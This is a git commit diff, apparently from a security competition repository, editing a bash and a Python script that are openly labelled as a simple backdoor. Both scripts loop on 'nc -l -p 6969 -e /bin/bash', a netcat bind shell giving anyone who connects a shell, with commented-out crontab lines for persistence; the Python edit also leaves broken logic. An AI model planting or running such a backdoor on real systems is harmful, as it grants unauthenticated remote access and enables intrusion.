6551ff2e0c0fba6b4422f0ed07a054009f64165e
PapaChain <braydenjw00@gmail.com>
2020-01-21 15:03:52 -0500

    Smol Changes

--- ISTS/bash_scripts/test.sh
+++ ISTS/bash_scripts/test.sh
@@ -4,14 +4,14 @@
 # what I am going to do with this. The first script will add something to cron
 # This is a very primative example of a backdoor on a program using netcat
 
-echo "How many seconds should I wait to re-open the beacon?(120s default)"
+echo "How many seconds should I wait to re-open the beacon?(5s default)"
 read delay
 echo "should I stop after a certian amount of iterations? (No limit default)"
 read limit
 
 #if there is no specified delay set to 1 second
 if [ -z "$delay" ] ; then
- let delay=1
+ let delay=5
 fi
 
 #No Limit given
@@ -22,6 +22,7 @@ if [ -z "$limit" ] ; then
  # $(crontab /bin/newcron ; rm /bin/newcron)
  while true ; do
    $(nc -l -p 6969 -e /bin/bash)
+   echo "Refeshed Backdoor"
    sleep $delay
  done
 
@@ -31,7 +32,7 @@ else
  # $(crontab */1 * * * * /bin/zsh4)
  while [ "$limit" -gt 0 ] ; do
    $(nc -l -p 6969 -e /bin/bash)
-   echo "Opened Shell"
+   echo "Refeshed Backdoor"
    sleep $delay
    ((limit--))
  done
--- ISTS/python_scripts/test.py
+++ ISTS/python_scripts/test.py
@@ -1,20 +1,24 @@
 import time
 import os
 import subprocess
+delay = 5
+limit = 0
 
-delay = input("How many seconds should I wait to re-open the beacon?(120s default)")
-limit = input("should I stop after a certian amount of iterations? (No limit default)")
+delay = input("How many seconds should I wait to re-open the beacon?(5s default): ")
+limit = input("should I stop after a certian amount of iterations? (No limit default): ")
 
 if delay == '':
     delay = 1
 
-if limit == '':
+elif limit == '' or limit == 0:
     while True:
+        print("Refeshing Beacon")
         os.system("nc -l -p 6969 -e /bin/bash")
-        time.sleep(5)
+        time.sleep(delay)
 
 else:
     while limit > 0:
+        print("Refeshing Beacon")
         os.system("nc -l -p 6969 -e /bin/bash")
         time.sleep(delay)
         limit -= 1
